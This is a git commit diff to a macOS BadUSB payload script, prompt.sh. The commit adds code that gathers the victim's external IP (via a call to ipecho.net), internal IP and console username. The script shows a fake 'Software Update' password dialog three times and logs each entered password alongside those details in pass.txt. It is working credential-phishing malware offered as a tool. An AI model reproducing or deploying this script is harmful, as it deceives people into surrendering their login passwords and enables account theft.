3967336a1282f2ad45cb3e1e5410ab9f74bd61af
Nate Whistler <nate.whistler@gmail.com>
2022-05-19 14:51:41 -0700

    Collects internal and external ip and formats username and password.

--- badusb/MacOS/prompt.sh
+++ badusb/MacOS/prompt.sh
@@ -1,23 +1,27 @@
 #!/usr/bin/env bash
 
-username=$(id -P $(stat -f%Su /dev/console) | awk -F '[:]' '{print $8}')
+externalip=$(curl -s http://ipecho.net/plain)
+internalip=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
+username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
+
+
 
 read -r -d '' applescriptCode <<'EOF'
    set uservar to do shell script "echo $username"
    set dialogText to text returned of (display dialog "Software Update is trying to authenticate user. Enter the password to allow this." with icon posix file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" with hidden answer default answer "")
    return dialogText
 EOF
-
-
 dialogText=$(osascript -e "$applescriptCode");
 
-echo $dialogText >>  pass.txt;
+echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;
 
+sleep 1
 dialogText=$(osascript -e "$applescriptCode");
 
-echo $dialogText >>  pass.txt;
+echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;
 
+sleep 1
 dialogText=$(osascript -e "$applescriptCode");
 
-echo $dialogText >>  pass.txt;
+echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;
 
